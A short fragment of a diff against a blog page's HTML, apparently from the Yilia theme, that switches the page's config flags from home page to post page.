       </div>
@@ -1142,8 +396,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: false,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
